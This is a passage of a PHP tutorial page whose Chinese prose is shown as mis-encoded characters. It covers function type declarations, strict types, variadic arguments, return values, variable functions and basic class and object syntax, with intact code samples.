<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span><span class="params">(C $c = null)</span> </span>&#123;</span><br><span class="line">    var_dump($c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="keyword">new</span> C);</span><br><span class="line">f(<span class="keyword">null</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="ä¸¥æ ¼ç±»å‹"><a href="#ä¸¥æ ¼ç±»å‹" class="headerlink" title="ä¸¥æ ¼ç±»å‹"></a>ä¸¥æ ¼ç±»å‹</h4><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœèƒ½åšåˆ°çš„è¯ï¼ŒPHPå°†ä¼šå¼ºè¿«é”™è¯¯ç±»å‹çš„å€¼è½¬ä¸ºå‡½æ•°æœŸæœ›çš„æ ‡é‡ç±»å‹ã€‚ ä¾‹å¦‚ï¼Œä¸€ä¸ªå‡½æ•°çš„ä¸€ä¸ªå‚æ•°æœŸæœ›æ˜¯<a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>ï¼Œä½†ä¼ å…¥çš„æ˜¯<a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a>ï¼Œæœ€ç»ˆå‡½æ•°å¾—åˆ°çš„å°†ä¼šæ˜¯ä¸€ä¸ª<a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>ç±»å‹çš„å€¼ã€‚</p>
<p>å¯ä»¥åŸºäºæ¯ä¸€ä¸ªæ–‡ä»¶å¼€å¯ä¸¥æ ¼æ¨¡å¼ã€‚åœ¨ä¸¥æ ¼æ¨¡å¼ä¸­ï¼Œåªæœ‰ä¸€ä¸ªä¸ç±»å‹å£°æ˜å®Œå…¨ç›¸ç¬¦çš„å˜é‡æ‰ä¼šè¢«æ¥å—ï¼Œå¦åˆ™å°†ä¼šæŠ›å‡ºä¸€ä¸ª<strong>TypeError</strong>ã€‚ å”¯ä¸€çš„ä¸€ä¸ªä¾‹å¤–æ˜¯å¯ä»¥å°†<a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a>ä¼ ç»™ä¸€ä¸ªæœŸæœ›<a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a>çš„å‡½æ•°ã€‚</p>
<p>å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span><span class="params">(int $a, int $b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a + $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    var_dump(sum(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">    var_dump(sum(<span class="number">1.5</span>, <span class="number">2.5</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (TypeError $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Error: '</span>.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int(3)</span></span><br><span class="line"><span class="comment">Error: Argument 1 passed to sum() must be of the type integer, float given, called in - on line 10</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h4 id="å¯å˜æ•°é‡çš„å‚æ•°åˆ—è¡¨"><a href="#å¯å˜æ•°é‡çš„å‚æ•°åˆ—è¡¨" class="headerlink" title="å¯å˜æ•°é‡çš„å‚æ•°åˆ—è¡¨"></a>å¯å˜æ•°é‡çš„å‚æ•°åˆ—è¡¨</h4><p>PHP åœ¨ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä¸­æ”¯æŒå¯å˜æ•°é‡çš„å‚æ•°åˆ—è¡¨ã€‚åœ¨ PHP 5.6 åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œç”± <em>â€¦</em> è¯­æ³•å®ç°ï¼›åœ¨ PHP 5.5 åŠæ›´æ—©ç‰ˆæœ¬ä¸­ï¼Œä½¿ç”¨å‡½æ•° <a href="https://www.php.net/manual/zh/function.func-num-args.php" target="_blank" rel="noopener">func_num_args()</a>ï¼Œ<a href="https://www.php.net/manual/zh/function.func-get-arg.php" target="_blank" rel="noopener">func_get_arg()</a>ï¼Œå’Œ <a href="https://www.php.net/manual/zh/function.func-get-args.php" target="_blank" rel="noopener">func_get_args()</a> ã€‚</p>
<p><em>â€¦</em> in PHP 5.6+ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span><span class="params">(...$numbers)</span> </span>&#123;</span><br><span class="line">    $acc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($numbers <span class="keyword">as</span> $n) &#123;</span><br><span class="line">        $acc += $n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $acc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ç”¨â€¦æŠŠlistè§£å‹åˆ°å‚æ•°åˆ—è¡¨ä¸­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a + $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> add(...[<span class="number">1</span>, <span class="number">2</span>]).<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$a = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">echo</span> add(...$a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨è€ç‰ˆæœ¬ï¼ˆä½äº5.5ï¼‰æ—¶ï¼Œä¸éœ€è¦ç‰¹æ®Šè¯­æ³•æ ‡æ³¨å¯å˜ï¼Œä½†æ˜¯éœ€è¦ä½¿ç”¨å‡½æ•°ï¼Œä¾‹å¦‚ï¼š <a href="https://www.php.net/manual/zh/function.func-num-args.php" target="_blank" rel="noopener">func_num_args()</a>, <a href="https://www.php.net/manual/zh/function.func-get-arg.php" target="_blank" rel="noopener">func_get_arg()</a> å’Œ <a href="https://www.php.net/manual/zh/function.func-get-args.php" target="_blank" rel="noopener">func_get_args()</a>.</p>
<p>å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $acc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (func_get_args() <span class="keyword">as</span> $n) &#123;</span><br><span class="line">        $acc += $n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $acc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h3><p>å‡½æ•°ä¸èƒ½è¿”å›å¤šä¸ªå€¼ï¼Œä½†å¯ä»¥é€šè¿‡è¿”å›ä¸€ä¸ªæ•°ç»„æ¥å¾—åˆ°ç±»ä¼¼çš„æ•ˆæœã€‚</p>
<p>ä»å‡½æ•°è¿”å›ä¸€ä¸ªå¼•ç”¨ï¼Œå¿…é¡»åœ¨å‡½æ•°å£°æ˜å’ŒæŒ‡æ´¾è¿”å›å€¼ç»™ä¸€ä¸ªå˜é‡æ—¶éƒ½ä½¿ç”¨å¼•ç”¨è¿ç®—ç¬¦ &amp;ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">returns_reference</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $someref;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$newref =&amp; returns_reference();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>PHP 7 å¢åŠ äº†å¯¹è¿”å›å€¼ç±»å‹å£°æ˜çš„æ”¯æŒã€‚åœ¨é»˜è®¤çš„å¼±æ¨¡å¼ä¸­ï¼Œå¦‚æœè¿”å›å€¼ä¸è¿”å›å€¼çš„ç±»å‹ä¸ä¸€è‡´ï¼Œåˆ™ä¼šè¢«å¼ºåˆ¶è½¬æ¢ä¸ºè¿”å›å€¼å£°æ˜çš„ç±»å‹ã€‚åœ¨å¼ºæ¨¡å¼ä¸­ï¼Œè¿”å›å€¼çš„ç±»å‹å¿…é¡»æ­£ç¡®ï¼Œå¦åˆ™å°†ä¼šæŠ›å‡ºä¸€ä¸ª<strong>TypeError</strong>å¼‚å¸¸ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span><span class="params">($a, $b)</span>: <span class="title">int</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a + $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(sum(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">var_dump(sum(<span class="number">1</span>, <span class="number">2.5</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int(3)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Fatal error: Uncaught TypeError: Return value of sum() must be of the type integer, float returned in - on line 5 in -:5</span></span><br><span class="line"><span class="comment">Stack trace:</span></span><br><span class="line"><span class="comment">#0 -(9): sum(1, 2.5)</span></span><br><span class="line"><span class="comment">#1 &#123;main&#125;</span></span><br><span class="line"><span class="comment">  thrown in - on line 5</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>è¿”å›å¯¹è±¡ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getC</span><span class="params">()</span>: <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(getC());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿”å›nullï¼ˆPHP 7.1.0+ï¼‰ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_item</span><span class="params">()</span>: ?<span class="title">string</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'item'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> $_GET[<span class="string">'item'</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="å¯å˜å‡½æ•°"><a href="#å¯å˜å‡½æ•°" class="headerlink" title="å¯å˜å‡½æ•°"></a>å¯å˜å‡½æ•°</h3><p>ä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHP å°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œå¹¶ä¸”å°è¯•æ‰§è¡Œå®ƒã€‚å¯å˜å‡½æ•°å¯ä»¥ç”¨æ¥å®ç°åŒ…æ‹¬å›è°ƒå‡½æ•°ï¼Œå‡½æ•°è¡¨åœ¨å†…çš„ä¸€äº›ç”¨é€”ã€‚</p>
<p>å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Variable</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $name = <span class="string">'Bar'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$name(); <span class="comment">// This calls the Bar() method</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"This is Bar"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$foo = <span class="keyword">new</span> Foo();</span><br><span class="line">$funcname = <span class="string">"Variable"</span>;</span><br><span class="line">$foo-&gt;$funcname();   <span class="comment">// This calls $foo-&gt;Variable()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å½“è°ƒç”¨é™æ€æ–¹æ³•æ—¶ï¼Œå‡½æ•°è°ƒç”¨è¦æ¯”é™æ€å±æ€§ä¼˜å…ˆã€‚</p>
<p>è°ƒç”¨æ•°ç»„å’Œç±»ä¸­çš„æ–¹æ³•ï¼Œä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"bar\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">baz</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"baz\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$func = <span class="keyword">array</span>(<span class="string">"Foo"</span>, <span class="string">"bar"</span>);</span><br><span class="line">$func(); <span class="comment">// prints "bar"</span></span><br><span class="line">$func = <span class="keyword">array</span>(<span class="keyword">new</span> Foo, <span class="string">"baz"</span>);</span><br><span class="line">$func(); <span class="comment">// prints "baz"</span></span><br><span class="line">$func = <span class="string">"Foo::bar"</span>;</span><br><span class="line">$func(); <span class="comment">// prints "bar" as of PHP 7.0.0; prior, it raised a fatal error</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">ç‰ˆæœ¬</th>
<th align="left">è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">7.0.0</td>
<td align="left">â€˜ClassName::methodNameâ€™ is allowed as variable function.</td>
</tr>
<tr>
<td align="left">5.4.0</td>
<td align="left">Arrays, which are valid callables, are allowed as variable functions.</td>
</tr>
</tbody></table>
<h3 id="å†…ç½®å‡½æ•°"><a href="#å†…ç½®å‡½æ•°" class="headerlink" title="å†…ç½®å‡½æ•°"></a>å†…ç½®å‡½æ•°</h3><p>PHPæ‰‹å†Œä¸­æ¯ä¸€ä¸ªå‡½æ•°çš„é¡µé¢ä¸­éƒ½æœ‰å…³äºå‡½æ•°å‚æ•°ã€è¡Œä¸ºæ”¹å˜ã€æˆåŠŸä¸å¦çš„è¿”å›å€¼ä»¥åŠä½¿ç”¨æ¡ä»¶ç­‰ä¿¡æ¯ã€‚äº†è§£è¿™äº›é‡è¦çš„ï¼ˆå¸¸å¸¸æ˜¯ç»†å¾®çš„ï¼‰å·®åˆ«æ˜¯ç¼–å†™æ­£ç¡®çš„ PHP ä»£ç çš„å…³é”®ã€‚</p>
<p>æœ‰æ—¶éœ€è¦åŠ è½½æ¨¡å—ï¼ˆå’Œæ‰©å±•æ¨¡å—ä¸€èµ·ç¼–è¯‘ï¼‰ä»¥ä½¿ç”¨æ¨¡å—ä¸­çš„å‡½æ•°ã€‚</p>
<h3 id="åŒ¿åå‡½æ•°"><a href="#åŒ¿åå‡½æ•°" class="headerlink" title="åŒ¿åå‡½æ•°"></a>åŒ¿åå‡½æ•°</h3><p>ä¹Ÿå«é—­åŒ…å‡½æ•°ã€‚å…è®¸ä¸´æ—¶åˆ›å»ºä¸€ä¸ªæ²¡æœ‰æŒ‡å®šåç§°çš„å‡½æ•°ã€‚</p>
<h3 id="Arrowå‡½æ•°"><a href="#Arrowå‡½æ•°" class="headerlink" title="Arrowå‡½æ•°"></a>Arrowå‡½æ•°</h3><p>PHP 7.4ä¹‹åæ–°å¢çš„ä½¿åŒ¿åå‡½æ•°è¯­æ³•æ›´ç®€æ´çš„å‡½æ•°ã€‚</p>
<h2 id="ç±»ä¸å¯¹è±¡"><a href="#ç±»ä¸å¯¹è±¡" class="headerlink" title="ç±»ä¸å¯¹è±¡"></a>ç±»ä¸å¯¹è±¡</h2><h3 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h3><h4 id="ç®€å•çš„ç±»å®šä¹‰"><a href="#ç®€å•çš„ç±»å®šä¹‰" class="headerlink" title="ç®€å•çš„ç±»å®šä¹‰"></a>ç®€å•çš„ç±»å®šä¹‰</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// å£°æ˜å±æ€§</span></span><br><span class="line">    <span class="keyword">public</span> $var = <span class="string">'a default value'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å£°æ˜æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å½“ä¸€ä¸ªæ–¹æ³•åœ¨ç±»å®šä¹‰å†…éƒ¨è¢«è°ƒç”¨æ—¶ï¼Œæœ‰ä¸€ä¸ªå¯ç”¨çš„ä¼ªå˜é‡ $thisã€‚$this æ˜¯ä¸€ä¸ªåˆ°ä¸»å«å¯¹è±¡çš„å¼•ç”¨ï¼ˆé€šå¸¸æ˜¯è¯¥æ–¹æ³•æ‰€ä»å±çš„å¯¹è±¡ï¼Œä½†å¦‚æœæ˜¯ä»ç¬¬äºŒä¸ªå¯¹è±¡<a href="https://www.php.net/manual/zh/language.oop5.static.php" target="_blank" rel="noopener">é™æ€</a>è°ƒç”¨æ—¶ä¹Ÿå¯èƒ½æ˜¯å¦ä¸€ä¸ªå¯¹è±¡ï¼‰ã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'$this is defined ('</span>;</span><br><span class="line">            <span class="keyword">echo</span> get_class(<span class="keyword">$this</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">")\n"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\$this is not defined.\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        A::foo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line">$a-&gt;foo();</span><br><span class="line"></span><br><span class="line">A::foo();</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;bar();</span><br><span class="line"></span><br><span class="line">B::bar();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Output of the above example in PHP 5:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span> is defined (A)</span><br><span class="line"><span class="keyword">$this</span> is not defined.</span><br><span class="line"><span class="keyword">$this</span> is defined (B)</span><br><span class="line"><span class="keyword">$this</span> is not defined.</span><br></pre></td></tr></table></figure>

<p>Output of the above example in PHP 7:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span> is defined (A)</span><br><span class="line"><span class="keyword">$this</span> is not defined.</span><br><span class="line"><span class="keyword">$this</span> is not defined.</span><br><span class="line"><span class="keyword">$this</span> is not defined.</span><br></pre></td></tr></table></figure>

<h4 id="new"><a href="#new" class="headerlink" title="new"></a>new</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$instance = <span class="keyword">new</span> SimpleClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¹Ÿå¯ä»¥è¿™æ ·åšï¼š</span></span><br><span class="line">$className = <span class="string">'Foo'</span>;</span><br><span class="line">$instance = <span class="keyword">new</span> $className(); <span class="comment">// Foo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ç±»å®šä¹‰å†…éƒ¨ï¼Œå¯ä»¥ç”¨ <em>new self</em> å’Œ <em>new parent</em> åˆ›å»ºæ–°å¯¹è±¡ã€‚</p>
<p>å½“æŠŠä¸€ä¸ªå¯¹è±¡å·²ç»åˆ›å»ºçš„å®ä¾‹èµ‹ç»™ä¸€ä¸ªæ–°å˜é‡æ—¶ï¼Œæ–°å˜é‡ä¼šè®¿é—®åŒä¸€ä¸ªå®ä¾‹ï¼Œå°±å’Œç”¨è¯¥å¯¹è±¡èµ‹å€¼ä¸€æ ·ã€‚æ­¤è¡Œä¸ºå’Œç»™å‡½æ•°ä¼ é€’å…¥å®ä¾‹æ—¶ä¸€æ ·ã€‚å¯ä»¥ç”¨<a href="https://www.php.net/manual/zh/language.oop5.cloning.php" target="_blank" rel="noopener">å…‹éš†</a>ç»™ä¸€ä¸ªå·²åˆ›å»ºçš„å¯¹è±¡å»ºç«‹ä¸€ä¸ªæ–°å®ä¾‹ã€‚</p>
<h4 id="å¯¹è±¡èµ‹å€¼"><a href="#å¯¹è±¡èµ‹å€¼" class="headerlink" title="å¯¹è±¡èµ‹å€¼"></a>å¯¹è±¡èµ‹å€¼</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$instance = <span class="keyword">new</span> SimpleClass();</span><br><span class="line"></span><br><span class="line">$assigned   =  $instance;</span><br><span class="line">$reference  =&amp; $instance;</span><br><span class="line"></span><br><span class="line">$instance-&gt;var = <span class="string">'$assigned will have this value'</span>;</span><br><span class="line"></span><br><span class="line">$instance = <span class="keyword">null</span>; <span class="comment">// $instance and $reference become null</span></span><br><span class="line"></span><br><span class="line">var_dump($instance);</span><br><span class="line">var_dump($reference);</span><br><span class="line">var_dump($assigned);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šä¾‹ç¨‹ä¼šè¾“å‡ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">NULL</span></span><br><span class="line">object(SimpleClass)<span class="comment">#1 (1) &#123;</span></span><br><span class="line">   [<span class="string">"var"</span>]=&gt;</span><br><span class="line">     string(<span class="number">30</span>) <span class="string">"$assigned will have this value"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PHP 5.4.0 èµ·ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªè¡¨è¾¾å¼æ¥è®¿é—®æ–°åˆ›å»ºå¯¹è±¡çš„æˆå‘˜ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> DateTime())-&gt;format(<span class="string">'Y'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šä¾‹ç¨‹çš„è¾“å‡ºç±»ä¼¼äºï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">2016</span></span><br></pre></td></tr></table></figure>

<h3 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><p>ç±»çš„å˜é‡æˆå‘˜å«åšâ€œå±æ€§â€ã€‚</p>
<p>å±æ€§å£°æ˜æ˜¯ç”±å…³é”®å­— <em>public</em>ï¼Œ<em>protected</em> æˆ–è€… <em>private</em> å¼€å¤´ï¼Œç„¶åè·Ÿä¸€ä¸ªæ™®é€šçš„å˜é‡å£°æ˜æ¥ç»„æˆã€‚å±æ€§ä¸­çš„å˜é‡å¯ä»¥åˆå§‹åŒ–ï¼Œä½†æ˜¯åˆå§‹åŒ–çš„å€¼å¿…é¡»æ˜¯å¸¸æ•°ï¼Œè¿™é‡Œçš„å¸¸æ•°æ˜¯æŒ‡ PHP è„šæœ¬åœ¨ç¼–è¯‘é˜¶æ®µæ—¶å°±å¯ä»¥å¾—åˆ°å…¶å€¼ï¼Œè€Œä¸ä¾èµ–äºè¿è¡Œæ—¶çš„ä¿¡æ¯æ‰èƒ½æ±‚å€¼ã€‚</p>
<p>ä¸ºäº†å‘åå…¼å®¹ PHP 4ï¼ŒPHP 5 å£°æ˜å±æ€§ä¾ç„¶å¯ä»¥ç›´æ¥ä½¿ç”¨å…³é”®å­— <em>var</em> æ¥æ›¿ä»£ï¼ˆæˆ–è€…é™„åŠ äºï¼‰<em>public</em>ï¼Œ<em>protected</em> æˆ– <em>private</em>ã€‚ä½†æ˜¯å·²ä¸å†éœ€è¦ <em>var</em> äº†ã€‚å¦‚æœç›´æ¥ä½¿ç”¨ <em>var</em> å£°æ˜å±æ€§ï¼Œè€Œæ²¡æœ‰ç”¨ <em>public</em>ï¼Œ<em>protected</em> æˆ– <em>private</em> ä¹‹ä¸€ï¼ŒPHP 5 ä¼šå°†å…¶è§†ä¸º <em>public</em>ã€‚</p>
<p>åœ¨ç±»çš„æˆå‘˜æ–¹æ³•é‡Œé¢ï¼Œå¯ä»¥ç”¨ *-&gt;*ï¼ˆå¯¹è±¡è¿ç®—ç¬¦ï¼‰ï¼š$this-&gt;propertyï¼ˆå…¶ä¸­ <em>property</em> æ˜¯è¯¥å±æ€§åï¼‰è¿™ç§æ–¹å¼æ¥è®¿é—®éé™æ€å±æ€§ã€‚é™æ€å±æ€§åˆ™æ˜¯ç”¨ *::*ï¼ˆåŒå†’å·ï¼‰ï¼šself::$property æ¥è®¿é—®ã€‚æ›´å¤šé™æ€å±æ€§ä¸éé™æ€å±æ€§çš„åŒºåˆ«å‚è§ <a href="https://www.php.net/manual/zh/language.oop5.static.php" target="_blank" rel="noopener">Static å…³é”®å­—</a>ã€‚</p>
<p>å®ä¾‹ï¼š</p>
